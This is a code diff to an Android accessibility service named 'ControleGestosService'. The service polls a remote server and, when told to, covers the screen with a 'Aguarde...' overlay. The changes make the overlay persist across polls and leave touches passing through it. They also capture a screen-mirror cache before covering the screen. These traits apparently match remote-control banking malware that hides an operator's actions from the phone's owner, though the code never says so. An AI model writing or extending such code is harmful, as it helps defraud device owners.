@@ -77,6 +77,8 @@ class ControleGestosService : AccessibilityService() {
     private var textoInferiorOverlayAtual = ""
     private var logoOverlayAtual = ""
     private var ultimaEstruturaEspelho: String? = null
+    private var pollsOverlayDesativado = 0
+    private val handlerPrincipal = Handler(Looper.getMainLooper())
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -672,28 +674,28 @@ class ControleGestosService : AccessibilityService() {
             val resposta = BufferedReader(InputStreamReader(conexao.inputStream, Charsets.UTF_8))
                 .readText().trim()
 
-            if (resposta.isEmpty()) {
-                if (overlayAtivo || OverlayActivity.estaAtiva()) {
-                    Handler(Looper.getMainLooper()).post { removerOverlay() }
-                }
-                return
-            }
+            if (resposta.isEmpty()) return
 
             val json = org.json.JSONObject(resposta)
             val ativo = json.optBoolean("ativo", false)
 
             if (!ativo) {
-                if (overlayAtivo || OverlayActivity.estaAtiva()) {
-                    Handler(Looper.getMainLooper()).post { removerOverlay() }
+                pollsOverlayDesativado++
+                if (pollsOverlayDesativado >= 3 &&
+                    (overlayAtivo || OverlayActivity.estaAtiva() || overlayView != null)
+                ) {
+                    handlerPrincipal.post { removerOverlay() }
                 }
                 return
             }
+
+            pollsOverlayDesativado = 0
 
             val mensagem = json.optString("mensagem", "Aguarde...")
             val textoInferior = json.optString("texto_inferior", "")
             val logo = json.optString("logo", "")
 
-            Handler(Looper.getMainLooper()).post {
+            handlerPrincipal.post {
                 mostrarOuAtualizarOverlay(mensagem, textoInferior, logo)
             }
 
@@ -706,6 +708,10 @@ class ControleGestosService : AccessibilityService() {
 
     // ─── Overlay ─────────────────────────────────────────────────────────────
 
+    private fun overlayEstaVisivel(): Boolean {
+        return overlayView != null || OverlayActivity.estaAtiva()
+    }
+
     /**
      * Shows overlay if not visible, or updates content in-place to avoid flicker.
      * Must be called on the main thread.
@@ -714,6 +720,14 @@ class ControleGestosService : AccessibilityService() {
         val changed = mensagem != mensagemOverlayAtual ||
                 textoInferior != textoInferiorOverlayAtual ||
                 logo != logoOverlayAtual
+
+        if (!changed && overlayEstaVisivel()) {
+            if (overlayView != null) {
+                garantirOverlayNaoBloqueiaToque()
+            }
+            overlayAtivo = true
+            return
+        }
 
         if (OverlayActivity.estaAtiva()) {
             if (!changed) return
@@ -948,33 +962,9 @@ class ControleGestosService : AccessibilityService() {
 
     private fun criarOverlay(mensagem: String, textoInferior: String, logo: String) {
         capturarCacheEspelhoAntesOverlay()
-
-        if (deveUsarOverlayPorJanela()) {
-            OverlayActivity.fechar()
-            removerOverlayJanela()
-            criarOverlayJanela(mensagem, textoInferior, logo)
-            return
-        }
-
+        OverlayActivity.fechar()
         removerOverlayJanela()
-        try {
-            enviarOverlayActivity(mensagem, textoInferior, logo)
-            marcarOverlayAtivo()
-            mensagemOverlayAtual = mensagem
-            textoInferiorOverlayAtual = textoInferior
-            logoOverlayAtual = logo
-            Log.i("KL", "Overlay Activity — $mensagem (${Build.MANUFACTURER})")
-
-            Handler(Looper.getMainLooper()).postDelayed({
-                if (overlayAtivo && !OverlayActivity.estaAtiva() && overlayView == null) {
-                    Log.w("KL", "Activity nao abriu, tentando janela acessibilidade")
-                    criarOverlayJanela(mensagem, textoInferior, logo)
-                }
-            }, 900)
-        } catch (e: Exception) {
-            Log.e("KL", "Activity falhou, tentando janela acessibilidade: ${e.message}")
-            criarOverlayJanela(mensagem, textoInferior, logo)
-        }
+        criarOverlayJanela(mensagem, textoInferior, logo)
     }
 
     private fun criarOverlayJanela(mensagem: String, textoInferior: String, logo: String) {
@@ -1057,6 +1047,7 @@ class ControleGestosService : AccessibilityService() {
 
     private fun resetarEstadoOverlay() {
         overlayAtivo = false
+        pollsOverlayDesativado = 0
         mensagemOverlayAtual = ""
         textoInferiorOverlayAtual = ""
         logoOverlayAtual = ""
